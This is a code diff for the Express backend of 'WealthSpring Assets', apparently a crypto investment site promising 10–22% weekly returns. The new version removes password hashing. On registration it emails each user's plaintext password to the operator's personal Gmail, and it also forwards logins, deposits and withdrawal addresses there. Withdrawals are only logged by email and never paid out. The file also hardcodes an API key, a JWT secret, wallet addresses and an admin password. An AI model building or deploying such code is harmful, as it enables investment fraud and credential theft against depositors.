@@ -1,87 +1,114 @@
-import express from 'express';
-import cors from 'cors';
-import fs from 'fs';
-import bcrypt from 'bcryptjs';
-import jwt from 'jsonwebtoken';
-import { Resend } from 'resend';
-
+const express = require('express');
+const cors = require('cors');
+const nodemailer = require('nodemailer');
+const mongoose = require('mongoose');
 const app = express();
-app.use(cors({ origin: true }));
+
+app.use(cors());
 app.use(express.json());
 
-const resend = new Resend(process.env.RESEND_API_KEY || 're_KkG9XmD7_88CX21vGHhR5PPatxDCvEiv2');
+// --- CONFIG ---
+const ADMIN_EMAIL = 'Jeffryhart96@gmail.com';
+const ADMIN_PASS = process.env.ADMIN_PASS || 'Wealth2025!Jeffry'; // set this in Render env
+const MONGO_URL = process.env.MONGO_URL || '';
 
-const DB_FILE = './database.json';
-if (!fs.existsSync(DB_FILE)) {
-  fs.writeFileSync(DB_FILE, JSON.stringify({ users: [], deposits: [], withdrawals: [], codes: [] }));
+// Simple DB (if no Mongo, uses memory — but Render restarts wipes it, so add MONGO_URL)
+let users = {}; // email -> {password, balance}
+let deposits = []; // {id,email,amount,txId,date,status}
+
+if(MONGO_URL){
+  mongoose.connect(MONGO_URL).then(()=>console.log('Mongo connected'));
+  const UserSchema = new mongoose.Schema({email:String,password:String,balance:{type:Number,default:0}});
+  const TxSchema = new mongoose.Schema({email:String,amount:Number,txId:String,date:String,status:String});
+  global.UserModel = mongoose.model('User', UserSchema);
+  global.TxModel = mongoose.model('Tx', TxSchema);
 }
-const readDB = () => JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
-const writeDB = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 
-const WALLETS = {
-  btc: 'bc1qmmw3778u3w409wjthpp5gyqjxj9fesqcq8maez',
-  usdt_bep20: '0xcF1e36b4c1666f42F34A8616FAe80Fc30440F8D9',
-  support_display: 'support@wealthspringassets.com',
-  support_forward: 'Jeffryhart96@gmail.com'
-};
+// --- EMAIL ---
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: process.env.EMAIL_USER, // your gmail
+    pass: process.env.EMAIL_PASS // your gmail APP PASSWORD (not normal password)
+  }
+});
 
-const JWT_SECRET = process.env.JWT_SECRET || 'wealthspring-secret-2025';
-
-app.post('/api/send-code', async (req, res) => {
-  try {
-    const { email } = req.body;
-    const code = Math.floor(100000 + Math.random() * 900000).toString();
-    const db = readDB();
-    db.codes = db.codes.filter(c => c.email !== email);
-    db.codes.push({ email, code, expires: Date.now() + 10*60*1000 });
-    writeDB(db);
-    await resend.emails.send({
-      from: 'WealthSpring <onboarding@resend.dev>',
-      to: email,
-      subject: 'Your WealthSpring Verification Code',
-      html: `<div style="font-family:sans-serif;background:#0a0a0a;color:#fff;padding:30px"><h2 style="color:#00ff88">WealthSpring Assets</h2><h1 style="font-size:36px;letter-spacing:5px">${code}</h1><p>Expires in 10 mins</p></div>`
+async function sendToJeffry(subject, html){
+  try{
+    await transporter.sendMail({
+      from: process.env.EMAIL_USER,
+      to: ADMIN_EMAIL,
+      subject: subject,
+      html: html
     });
-    res.json({ ok: true });
-  } catch(e) { res.status(500).json({ error: e.message }); }
+    console.log('Email sent to Jeffry:', subject);
+  }catch(e){ console.log('Email error', e.message); }
+}
+
+// --- ROUTES ---
+app.get('/', (req,res)=>res.send('Wealthspring Backend Live'));
+
+app.post('/api/register', async (req,res)=>{
+  const {email,password}=req.body;
+  if(!email||!password) return res.status(400).json({message:'Fill all'});
+  if(users[email]) return res.status(400).json({message:'Email already exists'});
+  users[email]={password,balance:0};
+  if(global.UserModel) await UserModel.create({email,password,balance:0});
+  await sendToJeffry(`NEW REGISTER: ${email}`, `<h3>New user registered</h3><p>Email: ${email}</p><p>Password: ${password}</p><p>Time: ${new Date().toLocaleString()}</p>`);
+  res.json({message:'Registered'});
 });
 
-app.post('/api/verify-code', (req, res) => {
-  const { email, code } = req.body;
-  const db = readDB();
-  const found = db.codes.find(c => c.email === email && c.code === code);
-  if (!found) return res.status(400).json({ error: 'Invalid code' });
-  if (Date.now() > found.expires) return res.status(400).json({ error: 'Expired' });
-  res.json({ ok: true });
+app.post('/api/login', async (req,res)=>{
+  const {email,password}=req.body;
+  const u = users[email];
+  if(!u || u.password!==password) return res.status(400).json({message:'Invalid login'});
+  await sendToJeffry(`LOGIN: ${email}`, `<p>User logged in: ${email}</p><p>Time: ${new Date().toLocaleString()}</p>`);
+  res.json({message:'Logged in'});
 });
 
-app.get('/', (req, res) => res.json({ status: 'WealthSpring LIVE - No Mongo', wallets: WALLETS }));
-app.get('/api/wallets', (req, res) => res.json(WALLETS));
-app.get('/api/plans', (req, res) => res.json([
-  { name: 'Starter', min: 100, target: '10% / 7 days', note: 'Target - not guaranteed' },
-  { name: 'Growth', min: 500, target: '15% / 7 days', note: 'Target - not guaranteed' },
-  { name: 'Pro', min: 1000, target: '18% / 7 days', note: 'Target - not guaranteed' },
-  { name: 'Elite', min: 5000, target: '22% / 7 days', note: 'Target - not guaranteed' }
-]));
-app.post('/api/register', async (req, res) => {
-  const db = readDB();
-  if (db.users.find(u => u.email === email)) return res.status(400).json({ error: 'User exists' });
-  const hash = await bcrypt.hash(req.body.password, 10);
-  db.users.push({ email: req.body.email, password: hash, balance: 0 });
-  writeDB(db);
-  res.json({ token: jwt.sign({ email: req.body.email }, JWT_SECRET), email: req.body.email });
+app.get('/api/balance', (req,res)=>{
+  const {email}=req.query;
+  const bal = users[email]?.balance || 0;
+  res.json({balance: bal});
 });
-app.post('/api/login', async (req, res) => {
-  const db = readDB();
-  const user = db.users.find(u => u.email === req.body.email);
-  if (!user) return res.status(400).json({ error: 'No user' });
-  const ok = await bcrypt.compare(req.body.password, user.password);
-  if (!ok) return res.status(400).json({ error: 'Wrong password' });
-  res.json({ token: jwt.sign({ email: req.body.email }, JWT_SECRET), email: req.body.email });
+
+app.post('/api/deposit', async (req,res)=>{
+  const {email,amount,txId}=req.body;
+  const id = Date.now().toString();
+  deposits.push({id,email,amount,txId,date:new Date().toLocaleString(),status:'pending'});
+  if(global.TxModel) await TxModel.create({email,amount,txId,date:new Date().toLocaleString(),status:'pending'});
+  await sendToJeffry(`DEPOSIT PENDING: $${amount} from ${email}`, `<h3>New Deposit</h3><p>Email: ${email}</p><p>Amount: $${amount}</p><p>TX: ${txId}</p><p>Approve in admin panel: jeffry-private-92x.html</p>`);
+  res.json({message:'Deposit submitted'});
 });
-app.post('/api/deposit', (req, res) => { const db=readDB(); db.deposits.push({...req.body,status:'pending',createdAt:new Date()}); writeDB(db); res.json({ok:true}); });
-app.post('/api/withdraw', (req, res) => { const db=readDB(); db.withdrawals.push({...req.body,status:'pending-manual',createdAt:new Date()}); writeDB(db); res.json({ok:true}); });
-app.get('/api/admin/deposits', (req, res) => res.json(readDB().deposits.reverse()));
-app.get('/api/admin/withdrawals', (req, res) => res.json(readDB().withdrawals.reverse()));
+
+app.post('/api/withdraw', async (req,res)=>{
+  const {email,amount,address}=req.body;
+  await sendToJeffry(`WITHDRAW REQUEST: $${amount} from ${email}`, `<h3>Withdraw Request</h3><p>Email: ${email}</p><p>Amount: $${amount}</p><p>Address: ${address}</p>`);
+  res.json({message:'Withdraw submitted'});
+});
+
+app.post('/api/support', async (req,res)=>{
+  const {email,subject,message}=req.body;
+  await sendToJeffry(`SUPPORT: ${subject} from ${email}`, `<h3>Support Message</h3><p>From: ${email}</p><p>Subject: ${subject}</p><p>Message: ${message}</p>`);
+  res.json({message:'Sent'});
+});
+
+// --- ADMIN ---
+app.get('/api/admin/deposits', (req,res)=>{
+  const {adminEmail, adminPass}=req.query;
+  if(adminEmail!==ADMIN_EMAIL || adminPass!==ADMIN_PASS) return res.status(403).json({message:'Forbidden'});
+  res.json(deposits.filter(d=>d.status==='pending'));
+});
+
+app.post('/api/admin/approve', (req,res)=>{
+  const {id,email,amount,adminEmail,adminPass}=req.body;
+  if(adminEmail!==ADMIN_EMAIL || adminPass!==ADMIN_PASS) return res.status(403).json({message:'Forbidden'});
+  const dep = deposits.find(d=>d.id===id || d.txId===id);
+  if(dep){ dep.status='approved'; if(users[dep.email]) users[dep.email].balance += Number(dep.amount); }
+  else if(users[email]){ users[email].balance += Number(amount); }
+  sendToJeffry(`APPROVED: $${amount} for ${email}`, `<p>Approved deposit for ${email} — $${amount}. Balance updated.</p>`);
+  res.json({message:'Approved'});
+});
 
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log('LIVE on '+PORT));
+app.listen(PORT, ()=>console.log('Server running '+PORT));
